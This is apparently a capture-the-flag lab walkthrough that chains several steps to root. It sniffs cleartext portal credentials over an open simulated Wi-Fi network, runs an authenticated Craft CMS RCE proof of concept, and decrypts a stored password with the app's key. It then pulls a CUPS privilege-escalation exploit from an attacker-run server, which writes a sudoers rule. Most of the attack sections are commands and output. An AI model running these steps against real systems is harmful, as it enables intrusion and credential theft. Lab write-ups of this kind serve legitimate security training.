# Layover

## Find Open Ports and Services Running on the Target IP

Lab context: target `<target_ip>`, attacker tun0 `<attacker_ip>`.

Command:

```bash
nmap -sC -sV <target_ip> -oA nmap_output
```

The scan reveals two services:

```text
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
3389/tcp open  ms-wbt-server xrdp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- `3389/tcp` is **xrdp** — the *Linux* RDP daemon — and nmap fingerprints the host OS as Linux. The box you RDP into is a Linux desktop session, not a Windows workstation.
- `22/tcp` OpenSSH is the **end** of the chain, not the start. Don't rush it.
- Only two ports. That is deliberate — the real attack surface (an internal `10.13.37.0/24` web segment) only appears after you pivot through the box.

Starting credentials are provided for this box (as is common in real engagements):

```text
contractor / Contractor2026!
```

---

## RDP Access

Connect with an RDP client:

```bash
xfreerdp /v:<target_ip> /u:contractor /p:'Contractor2026!' \
  /cert:ignore /dynamic-resolution +clipboard /drive:share,/tmp/share
```

> On newer Kali it's `xfreerdp3`; otherwise `apt install freerdp2-x11`. The `/drive:` share gives you a folder to shuttle tools/PoCs through later.

Once the desktop loads, open a terminal and do the host recon that actually matters — do **not** go straight at SSH:

```bash
id; hostname
ip addr
ip route
nmcli device status
nmcli device wifi list
```

```text
uid=1001(contractor) gid=1001(contractor) groups=1001(contractor),27(sudo),111(netdev),121(wireshark)
airside-ws01
```

Two things in that `id` output are not decoration: you're in the **`netdev`** and **`wireshark`** groups. The box is explicitly handing you packet-capture rights — that's the intended path.

---

## Discover the Internal Network

The interface and Wi-Fi state:

```text
6: wlan2: <NO-CARRIER,BROADCAST,MULTICAST,UP> ... state DOWN
7: wlan3: <NO-CARRIER,BROADCAST,MULTICAST,UP> ... state DOWN
10: eth0@if11: ... inet 10.159.143.45/24 ... dynamic eth0

DEVICE  TYPE      STATE         CONNECTION
wlan2   wifi      disconnected  --
wlan3   wifi      disconnected  --
eth0    ethernet  unmanaged     --

IN-USE  BSSID              SSID                   MODE   CHAN  RATE       SIGNAL
        02:00:00:00:00:00  HTB International WiFi  Infra  6     54 Mbit/s  100
```

- **Two wireless NICs** (`wlan2`, `wlan3`), both down — the classic "one card to connect, one to monitor" setup.
- SSID **HTB International WiFi**, Infra mode, channel 6, BSSID `02:00:00:00:00:00`.
- The `02:00:00:00:0X:00` MACs are `mac80211_hwsim` — a simulated radio environment, so monitor mode and capture behave like real hardware.
- `ip route` shows no path to `10.13.37.0/24` yet. That gap is the whole point.

Test the cheap path first — try to associate `wlan2`:

```bash
nmcli device wifi connect "HTB International WiFi" ifname wlan2
```

```text
connected
```

It's an **open network** — no WPA handshake to crack. Confirm the lease and route:

```bash
ip addr show wlan2
ip route
```

```text
6: wlan2: ... inet 10.13.37.182/24 brd 10.13.37.255 scope global dynamic ... wlan2

default via 10.159.143.1 dev eth0  proto dhcp src 10.159.143.45 metric 100
default via 10.13.37.1  dev wlan2  proto dhcp src 10.13.37.182 metric 20600
10.13.37.0/24           dev wlan2  proto kernel scope link src 10.13.37.182 metric 600
10.159.143.0/24         dev eth0   proto kernel scope link src 10.159.143.45 metric 100
```

You're on the internal segment as `10.13.37.182/24`, and your `eth0` default route still wins (metric 100 vs 20600), so your management path back is safe.

---

## Capture Credentials from Wireless Traffic

The "authentication information in the traffic" is a simulated employee client periodically logging into the internal portal over cleartext HTTP. You just need to be listening — but **where** you listen matters.

**Managed mode is not enough.** A capture on `wlan2` only sees your own unicast + broadcast:

```bash
sudo tcpdump -i wlan2 -n -c 40
```

```text
# only your own box's noise (Chrome phoning home, captive-portal check).
# the other client's unicast never reaches a managed-mode NIC.
```

Because it's an **open** network, every client's HTTP is in the clear over the air — so put the *second* card into monitor mode and sniff the radio. Do it manually; do **not** run `airmon-ng check kill` (it kills NetworkManager and drops your `wlan2` link to the internal net).

The subtlety that bites here: NetworkManager grabs the card back and reverts it to managed, so **disown it first**:

```bash
# stop NetworkManager from stealing wlan3 back
sudo nmcli device set wlan3 managed no

# monitor + channel 6
sudo ip link set wlan3 down
sudo iw dev wlan3 set monitor control
sudo ip link set wlan3 up
sudo iw dev wlan3 set channel 6

iw dev wlan3 info      # MUST say: type monitor, channel 6
```

```text
Interface wlan3
    type monitor
    channel 6 (2437 MHz), width: 20 MHz (no HT)
```

Now sniff over-the-air for the portal login POST and let it sit a few minutes for the automated client to cycle:

```bash
sudo tshark -i wlan3 -Y 'http.request and ip.dst == 10.13.37.10' \
  -T fields -e ip.src -e http.request.method -e http.request.uri \
  -e urlencoded-form.key -e urlencoded-form.value
```

```text
10.13.37.132  POST  /miles/login.php  username,password  jenny,Fl1ghtDeck2026!
```

The automated client (`10.13.37.132`) logs in. Portal credentials recovered:

```text
jenny : Fl1ghtDeck2026!
```

> Tip: if the live decode drops reassembled HTTP in monitor mode, capture raw and read it back:
> ```bash
> sudo timeout 180 tcpdump -i wlan3 -w /tmp/air.pcap
> tshark -r /tmp/air.pcap -Y 'http.request.method=="POST"' \
>   -T fields -e ip.src -e http.host -e http.request.uri \
>   -e urlencoded-form.key -e urlencoded-form.value
> ```

---

## Enumerate the Internal Web Portal

Resolve the portal against the internal DNS (the gateway) and pin the hosts entry:

```bash
dig +short portal.international.htb @10.13.37.1
dig +short miles.international.htb  @10.13.37.1
dig +short international.htb        @10.13.37.1
```

```text
10.13.37.10
10.13.37.10
10.13.37.10
```

```bash
echo "10.13.37.10 portal.international.htb miles.international.htb international.htb" \
  | sudo tee -a /etc/hosts
```

Log into the Miles app at `http://portal.international.htb/miles/login.php` as `jenny : Fl1ghtDeck2026!` (Jenny Crawford's account). Then confirm the stack is Craft:

```bash
curl -s -I http://portal.international.htb/
curl -s 'http://portal.international.htb/index.php?p=actions/users/session-info' \
  -H 'Accept: application/json'
curl -s -I http://portal.international.htb/index.php?p=admin/login
```

```text
Server: nginx/1.24.0 (Ubuntu)
{"isGuest":true,"timeout":0,"csrfTokenName":"CRAFT_CSRF_TOKEN","csrfTokenValue":"zY5C2mFEQh0a2fOI..."}
...
X-Powered-By: Craft CMS
```

`X-Powered-By: Craft CMS` plus a valid `session-info` JSON confirms Craft. The CP trigger is still `admin` — `/admin/login` returning `400` is Craft rejecting the bare request format, not a `404`. The installed version is **Craft CMS 5.9.8**, which is exactly what the next stage depends on.

---

## Establish an Authenticated Craft Session

Jenny's portal login is a Craft user login (Miles is a section of the Craft site), so her creds work on the CP side. Drive it with a cookie jar so the element-search action is reachable:

```bash
CJ=/tmp/craft.jar

# 1) fresh CSRF + session cookie
CSRF=$(curl -s -c $CJ 'http://portal.international.htb/index.php?p=actions/users/session-info' \
  -H 'Accept: application/json' | python3 -c 'import sys,json;print(json.load(sys.stdin)["csrfTokenValue"])')

# 2) log in as jenny
curl -s -b $CJ -c $CJ 'http://portal.international.htb/index.php?p=actions/users/login' \
  -H 'Accept: application/json' -H "X-CSRF-Token: $CSRF" \
  --data-urlencode "loginName=jenny" \
  --data-urlencode "password=Fl1ghtDeck2026!"

# 3) confirm authenticated
curl -s -b $CJ 'http://portal.international.htb/index.php?p=actions/users/session-info' \
  -H 'Accept: application/json'
```

Step 2 returns a `returnUrl` + fresh CSRF; step 3 flips to `isGuest:false`:

```text
{"isGuest":false,"timeout":3600,"csrfTokenName":"CRAFT_CSRF_TOKEN",
 "csrfTokenValue":"9xNNFPa5...","id":2,"uid":"a6638c5c-1d6e-4e80-838c-03bf5a2c8f33",
 "username":"jenny","email":"jenny.crawford@htb-international.htb"}
```

Note `admin:false` on this account (`"fullName":"Jenny Crawford"`, user id 2) — the element-search RCE works for any authenticated Craft user, not just an admin. You now have a working session jar to drive the exploit with.

---

## Remote Code Execution via Craft CMS (CVE-2026-31857)

Craft CMS 5.9.8 is vulnerable to **authenticated remote code execution** via a server-side template injection in the element-search functionality, reached through the index.php-routed action endpoint:

```text
POST /index.php?p=actions/element-search/search
```

With Jenny's authenticated session in hand, pull the public PoC on Kali and push it over the RDP `/tmp/share` mount (the target has no outbound internet), then run it against the portal:

```bash
python3 cve-2026-31857.py -u http://portal.international.htb \
  --cookie-jar /tmp/craft.jar -c 'id'
```

A public proof-of-concept ([TRX-0/CVE-2026-31857-craftcms-ssti](https://github.com/TRX-0/CVE-2026-31857-craftcms-ssti/blob/main/cve-2026-31857.py)) confirms command execution:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

That is the first OS-level foothold on the internal Linux server (`portal`) — an unprivileged web-server context.

---

# Lateral Movement

## Enumerate the Application as www-data

Webroot: `/var/www/portal`.

```bash
cat /var/www/portal/.env
ls -la /var/www/portal/storage/backups/
find /var/www/portal/modules -name '*.php'
```

Three artifacts matter:

**1. The `.env` file** — `/var/www/portal/.env`. Exposes the Craft security key and MySQL connection details. (Secret values omitted.)

**2. A database backup** — `/var/www/portal/storage/backups/`. Extracting it and browsing the tables turns up `miles_members` (passenger/member data). It does **not** contain the Linux user's password — a database backup doesn't mean the credential you need is in a users table.

**3. Custom module source** — `/var/www/portal/modules/htbairways/console/controllers/MilesController.php`. The real prize: a setting called `mailRelayPassword` is stored **encrypted**, and the source shows exactly how the application decrypts it.

---

## Recover the Credential

The DB holds an encrypted `mailRelayPassword`, the `.env` holds the Craft security key, and the module source shows the decryption routine (the app passes the value through Craft's own decryption using its own key):

```text
encrypted DB value  +  Craft security key  +  app decryption logic  =  plaintext
```

Reuse the application's own key and logic (via Craft's console or a small PHP stub calling `Craft::$app->security->decryptByKey()`) to recover the plaintext credential. (Recovered value omitted.)

> Encrypted does not mean unrecoverable — if the app can decrypt a value at runtime, so can you, using the same key it does.

---

## SSH Access

The module source tied the mail-relay config to a Linux account — but an application username is not automatically an OS account. Confirm it exists, then reuse the recovered credential against SSH (flagged in the very first Nmap scan):

```bash
grep aporter /etc/passwd            # from the www-data shell
ssh aporter@portal.international.htb
whoami; id
```

```text
aporter@portal:~$
```

This drops a proper, interactive Linux user shell on `portal` as **aporter** — a step up from the `www-data` web context. (Username/password omitted.)

---

## Retrieve User Flag

```bash
cat /home/aporter/user.txt
```

The user flag is obtained (omitted here).

---

# Privilege Escalation

## Enumerate Local Services

A new shell means starting enumeration over:

```bash
id; whoami; sudo -l; uname -a
ps aux
ss -lntup
systemctl list-units --type=service
```

One service stands out — **CUPS**, listening on loopback only:

```text
127.0.0.1:631
```

Because it's bound to loopback it never appeared in the external Nmap scan. Pin the exact version:

```bash
cups-config --version
```

```text
2.4.16
```

CUPS 2.4.16 falls in the affected range for **CVE-2026-34990**.

---

## Stage and Verify the CUPS PoC (CVE-2026-34990)

`portal` has no outbound internet, but it can reach your pivot host (`airside-ws01`, `10.13.37.182`) on the internal net — the same path the Craft reverse shell used. So fetch the CUPS PoC ([0xc4rc3l/CVE-2026-34990-poc](https://github.com/0xc4rc3l/CVE-2026-34990-poc/blob/main/exploit.py)) onto `airside-ws01`, serve it, and pull it to `/tmp` on `portal`:

```bash
# on airside-ws01 (10.13.37.182), in the folder holding the PoC:
python3 -m http.server 8000
```

```bash
# on portal as aporter — use the PoC's real filename:
cd /tmp
wget http://10.13.37.182:8000/exploit.py -O cups.py
```

Verify before running anything:

```bash
which ipptool; python3 --version; which socat nc
cups-config --version
ss -lntup | grep 631
ls -lh /tmp/cups.py
python3 -m py_compile /tmp/cups.py && echo ok
```

```text
# CUPS 2.4.16; cupsd bound to 127.0.0.1:631 and [::1]:631;
# ipptool, python3, socat, nc all present — every dependency the IPP-manipulation PoC needs.
```

> A filename tells you nothing. Several files named `exploit.py` existed during this engagement (one for Craft, one for CUPS). Confirm target, version, and dependencies — and actually read the script. `py_compile` passing only proves valid syntax; a missing `import os`, for example, throws a `NameError` at module load before any exploit logic runs.

---

## Trigger and Obtain Root

At a high level the PoC abuses local IPP communication with `cupsd`:

```text
rogue local IPP listener → CUPS interaction → local token capture
  → privileged printer operation → file write → sudoers modification
```

Run it from the local user shell:

```bash
python3 /tmp/cups.py
```

```text
[*] CUPS 2.4.16 Local-printer exploit
[*] Target file: /etc/sudoers.d/aporter-pwn
[*] Starting Local-token capture...
[+] Captured token: <redacted>
[+] Local token obtained
[*] Candidate attempt 1/12
[+] Target file appears to have been created!
[*] Testing sudo...
sudo: a password is required
[-] Attempt did not succeed.
[*] Candidate attempt 2/12
[+] Target file appears to have been created!
[*] Testing sudo...
uid=0(root) gid=0(root) groups=0(root)
[+] SUCCESS
```

The PoC stands up a loopback listener, gets `cupsd` to hand over a local authorization token, and uses a privileged printer operation to write a rule into `/etc/sudoers.d/`. It runs as a short retry loop — the file write races against `cupsd`, so the first attempt can create the file before it is valid (sudo still prompts) and a later attempt wins the race. Once the drop lands, `sudo` honors it:

```bash
sudo /bin/bash
id        # uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
```

The root flag is obtained (omitted here).

---

# Attack Chain

```text
External services (SSH + RDP/xrdp)
  → RDP as contractor → airside-ws01 (Linux desktop)
  → open Wi-Fi "HTB International WiFi" → 10.13.37.0/24 (wlan2: 10.13.37.182)
  → monitor-mode sniff on wlan3 → portal creds (jenny : Fl1ghtDeck2026!)
  → portal.international.htb (10.13.37.10) → Craft CMS 5.9.8
  → authenticated RCE (CVE-2026-31857) → www-data
  → .env + DB backup + module source → decrypt mailRelayPassword
  → SSH as aporter on "portal" → User Flag
  → cupsd 2.4.16 → CVE-2026-34990 → Root
```